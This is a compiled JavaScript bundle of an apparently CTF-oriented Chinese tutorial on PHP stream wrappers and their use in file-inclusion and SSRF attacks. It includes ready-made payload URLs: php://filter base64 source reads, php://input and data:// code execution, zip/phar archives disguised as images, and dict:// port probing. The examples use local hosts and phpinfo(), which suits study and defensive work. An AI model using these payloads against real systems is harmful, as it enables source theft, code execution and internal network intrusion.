(window.webpackJsonp=window.webpackJsonp||[]).push([[82],{406:function(e,t,_){"use strict";_.r(t);var v=_(4),p=Object(v.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"php伪协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php伪协议"}},[e._v("#")]),e._v(" PHP伪协议")]),e._v(" "),t("h2",{attrs:{id:"file"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#file"}},[e._v("#")]),e._v(" file://")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on/off")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":"),t("code",[e._v("on/off")])])]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("ul",[t("li",[e._v("用于读取本地文件系统，不受"),t("code",[e._v("allow_url_fopen")]),e._v("与"),t("code",[e._v("allow_url_include")]),e._v("的影响")]),e._v(" "),t("li",[t("code",[e._v("include( ) /require( )/include_once()/require_once()")]),e._v("参数可控的情况下，如导入为非"),t("code",[e._v(".php")]),e._v("文件，则仍按照"),t("code",[e._v("php")]),e._v("语法进行解析，这由"),t("code",[e._v("include()")]),e._v("函数所决定。")])]),e._v(" "),t("p",[e._v("说明")]),e._v(" "),t("p",[t("code",[e._v("file://")]),e._v("文件系统是PHP使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用CLI的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如"),t("code",[e._v("fopen()")]),e._v("和"),t("code",[e._v("file_get_contents(), include_path")]),e._v(" 会可选地搜索，也作为相对的路径。")]),e._v(" "),t("p",[e._v("用法")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("/path/to/file.ext")])]),e._v(" "),t("li",[t("p",[e._v("relative/path/to/file.ext")])]),e._v(" "),t("li",[t("p",[e._v("fileInCwd.ext")])]),e._v(" "),t("li",[t("p",[e._v("C : /path/to/winfile.ext")])]),e._v(" "),t("li",[t("p",[e._v("C : \\path\\to\\winfile.ext")])]),e._v(" "),t("li",[t("p",[e._v("\\\\smbserver\\share\\path\\to\\winfile.ext")])]),e._v(" "),t("li",[t("p",[e._v("file : ///path/to/file.ext")])])]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("file: //[文件的绝对路径和文件名]")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=file://E:\\phpStudy\\ PHPTutorial\\WWW\\phpinfo.php\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("file: //[文件的相对路径和文件名]")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=./phpinfo.php\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("file: //[http://网络路径和文件名]")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.php\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])])]),e._v(" "),t("h2",{attrs:{id:"http-https-协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#http-https-协议"}},[e._v("#")]),e._v(" http://&https://协议")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":"),t("code",[e._v("on")])])]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("ul",[t("li",[e._v("作用:常规"),t("code",[e._v("URL")]),e._v("形式，允许通过"),t("code",[e._v("HTTP 1.0")]),e._v("的"),t("code",[e._v("GET")]),e._v("方法，以只读访问文件或资源。")]),e._v(" "),t("li",[t("code",[e._v("CTF")]),e._v("中通常用于远程包含。")])]),e._v(" "),t("p",[e._v("用法")]),e._v(" "),t("ul",[t("li",[e._v("http: //example.com")]),e._v(" "),t("li",[e._v("http: //example.com/file.php?var1=var1&var2=var2")]),e._v(" "),t("li",[e._v("http: //user:password@exampLe.com")]),e._v(" "),t("li",[e._v("https: //example.com")]),e._v(" "),t("li",[e._v("https: //example.com/file.php?var1=var1&var2=var2")]),e._v(" "),t("li",[e._v("https: //user:password@example.com")])]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.php\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"php-协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php-协议"}},[e._v("#")]),e._v(" php://协议")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on/off")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":仅"),t("code",[e._v("php://input")]),e._v(" "),t("code",[e._v("php://stdin")]),e._v(" "),t("code",[e._v("php://memory")]),e._v(" "),t("code",[e._v("php://temp")]),e._v("需要"),t("code",[e._v("on")])])]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("php://")]),e._v("访问各个输入/输出流"),t("code",[e._v("I/O streams")])]),e._v(" "),t("li",[e._v("在"),t("code",[e._v("CTF")]),e._v("中经常使用的是"),t("code",[e._v("php://filter")]),e._v("和"),t("code",[e._v("php://input")])]),e._v(" "),t("li",[t("code",[e._v("php://filter")]),e._v("用于读取源码，"),t("code",[e._v("php://input")]),e._v("用于执行"),t("code",[e._v("php")]),e._v("代码。")])]),e._v(" "),t("p",[e._v("说明")]),e._v(" "),t("p",[t("code",[e._v("PHP")]),e._v("提供了一些杂项输入/输出"),t("code",[e._v("IO")]),e._v("流，允许访问"),t("code",[e._v("PHP")]),e._v("的输入输出流、标准输入输出和错误描述符、内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。")]),e._v(" "),t("table",[t("thead",[t("tr",[t("th",{staticStyle:{"text-align":"center"}},[e._v("协议")]),e._v(" "),t("th",{staticStyle:{"text-align":"center"}},[e._v("作用")])])]),e._v(" "),t("tbody",[t("tr",[t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("php://input")])]),e._v(" "),t("td",{staticStyle:{"text-align":"center"}},[e._v("可以访问请求的原始数据的只读流，在"),t("code",[e._v("POST")]),e._v("请求中访问"),t("code",[e._v("POST")]),e._v("的"),t("code",[e._v("data")]),e._v("部分，在"),t("code",[e._v('enctype="multipart/form-data"')]),e._v("的时候"),t("code",[e._v("php://input")]),e._v("是无效的。")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("php://output")])]),e._v(" "),t("td",{staticStyle:{"text-align":"center"}},[e._v("只写的数据流，允许以"),t("code",[e._v("print")]),e._v("和"),t("code",[e._v("echo")]),e._v("—样的方式写入到输出缓冲区。")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("php://memory")]),e._v(" "),t("code",[e._v("php://temp")])]),e._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("(>=5.1.0)")]),e._v("一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是"),t("code",[e._v("php://memory")]),e._v("总是把数据储存在内存中，而"),t("code",[e._v("php://temp")]),e._v("会在内存量达到预定义的限制后(默认是"),t("code",[e._v("2MB")]),e._v("）存入临时文件中。临时文件位置的决定和"),t("code",[e._v("sys_get_temp_dir()")]),e._v("的方式一致。")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("php://filter")])]),e._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("code",[e._v("(>=5.0.0)")]),e._v("种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式"),t("code",[e._v("(all-in-one)")]),e._v("的文件函数非常有用，类似"),t("code",[e._v("readfile()")]),e._v("、"),t("code",[e._v("file()")]),e._v("和"),t("code",[e._v("file_get_contents()")]),e._v("，在数据流内容读取之前没有机会应用其他过滤器。")])])])]),e._v(" "),t("h3",{attrs:{id:"php-filter"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php-filter"}},[e._v("#")]),e._v(" php://filter")]),e._v(" "),t("p",[e._v("说明")]),e._v(" "),t("ul",[t("li",[e._v("经常使用的一种伪协议，一般用于任意文件读取，有时也可以用于"),t("code",[e._v("getshell")]),e._v(".在"),t("code",[e._v("allow_url_fopen")]),e._v("、"),t("code",[e._v("allow_url_include")]),e._v("都为"),t("code",[e._v("OFF")]),e._v("的情况下也可以使用.")])]),e._v(" "),t("p",[e._v("参数")]),e._v(" "),t("table",[t("thead",[t("tr",[t("th",[e._v("名称")]),e._v(" "),t("th",[e._v("描述")]),e._v(" "),t("th",[e._v("备注")])])]),e._v(" "),t("tbody",[t("tr",[t("td",[e._v("resource=<要过滤的数据流>")]),e._v(" "),t("td",[e._v("指定了你要筛选过滤的数据流。")]),e._v(" "),t("td",[e._v("必选")])]),e._v(" "),t("tr",[t("td",[e._v("read=<读链的筛选列表>")]),e._v(" "),t("td",[e._v("可以设定一个或多个过滤器名称，以管道符"),t("code",[e._v("(|)")]),e._v("分隔。")]),e._v(" "),t("td",[e._v("可选")])]),e._v(" "),t("tr",[t("td",[e._v("write=<写链的筛选列表>")]),e._v(" "),t("td",[e._v("可以设定一个或多个过滤器名称，以管道符"),t("code",[e._v("(|)")]),e._v("分隔。")]),e._v(" "),t("td",[e._v("可选")])]),e._v(" "),t("tr",[t("td",[e._v("<;两个链的筛选列表>")]),e._v(" "),t("td",[e._v("任何没有以read=或write= 作前缀的筛选器列表会视情况应用于读或写链。")]),e._v(" "),t("td")])])]),e._v(" "),t("p",[e._v("例子")]),e._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[e._v("php"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(":")]),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("//filter/[read/write]=string.[rot13/strip_tags/……]/resource=xxx")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("?")]),e._v("file"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("php"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(":")]),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("//filter/read=convert.base64-encode/resource=xxx.php")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("?")]),e._v("file"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("php"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(":")]),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("//filter/read=string.rot13/resource=xxx.php")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h3",{attrs:{id:"php-input"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php-input"}},[e._v("#")]),e._v(" php://input")]),e._v(" "),t("p",[e._v("说明")]),e._v(" "),t("p",[e._v("用于执行"),t("code",[e._v("POST")]),e._v("数据中的"),t("code",[e._v("PHP")]),e._v("代码")]),e._v(" "),t("p",[e._v("注意")]),e._v(" "),t("p",[t("code",[e._v('enctype= "multipart/form-data"')]),e._v("的时候"),t("code",[e._v("php://input")]),e._v("是无效的")]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("p",[e._v("POST数据："),t("code",[e._v("<?php phpinfo()?>")])]),e._v(" "),t("p",[t("code",[e._v("http://127.0.0.1/index.php?file=php://input")])]),e._v(" "),t("h2",{attrs:{id:"data"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#data"}},[e._v("#")]),e._v(" data://")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":"),t("code",[e._v("on")])])]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("p",[e._v("自"),t("code",[e._v("PHP>=5.2.0")]),e._v("起，可以使用"),t("code",[e._v("data://")]),e._v("数据流封装器，以传递相应格式的数据。通常可以用来执行"),t("code",[e._v("PHP")]),e._v("代码。")]),e._v(" "),t("p",[e._v("用法")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("data://text/plain,<?php%20phpinfo()?>")])]),e._v(" "),t("li",[t("code",[e._v("data://text/plain;base64,<?php%20phpinfo()?>")])])]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("data://text/plain,")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("data://text/plain;base64,")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])])]),e._v(" "),t("h2",{attrs:{id:"zip-bzip2-zlib"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#zip-bzip2-zlib"}},[e._v("#")]),e._v(" zip://&bzip2://&zlib://")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on/off")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":"),t("code",[e._v("on/off")])])]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("p",[t("code",[e._v("zip://&bzip2://&zlib://")]),e._v("均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀:"),t("code",[e._v("jpg")]),e._v(" "),t("code",[e._v("png")]),e._v(" "),t("code",[e._v("gif")]),e._v(" "),t("code",[e._v("xxx")]),e._v("等等。")]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("ul",[t("li",[t("p",[t("code",[e._v("zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]")])]),e._v(" "),t("p",[e._v("压缩"),t("code",[e._v("phpinfo.txt")]),e._v("为"),t("code",[e._v("phpinfo.zip")]),e._v("，压缩包重命名为"),t("code",[e._v("phpinfo.jpg")]),e._v("，并上传")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("compress.bzip2: //file.bz2")]),e._v(" "),t("p",[e._v("压缩phpinfo.txt为 phpinfo.bz2并上传（同样支持任意后缀名)")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("compress.zlib://file.gz")]),e._v(" "),t("p",[e._v("压缩phpinfo.txt为phpinfo.gz并上传(同样支持任意后缀名)")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])])]),e._v(" "),t("h2",{attrs:{id:"phar"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#phar"}},[e._v("#")]),e._v(" phar://")]),e._v(" "),t("p",[e._v("作用")]),e._v(" "),t("p",[t("code",[e._v("phar://")]),e._v("协议与"),t("code",[e._v("zip://")]),e._v("类似，同样可以访问"),t("code",[e._v("zip")]),e._v("格式压缩包内容")]),e._v(" "),t("p",[e._v("示例")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"dict"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dict"}},[e._v("#")]),e._v(" dict://")]),e._v(" "),t("p",[e._v("条件")]),e._v(" "),t("ul",[t("li",[t("code",[e._v("allow_url_fopen")]),e._v("："),t("code",[e._v("on")])]),e._v(" "),t("li",[t("code",[e._v("allow_url_include")]),e._v(":"),t("code",[e._v("on")])])]),e._v(" "),t("p",[e._v("说明")]),e._v(" "),t("p",[e._v("与gopher协议一般都出现在"),t("code",[e._v("ssrf")]),e._v("协议中，用来探测端口的指纹信息。同时也可以用它来代替"),t("code",[e._v("gopher")]),e._v("协议进行"),t("code",[e._v("ssrf")]),e._v("攻击。")]),e._v(" "),t("p",[e._v("用法")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("探测端口指纹")]),e._v(" "),t("p",[t("code",[e._v("http://127.0.0.1/?url=dict://192.168.0.0:6379")])])])])])}),[],!1,null,null,null);t.default=p.exports}}]);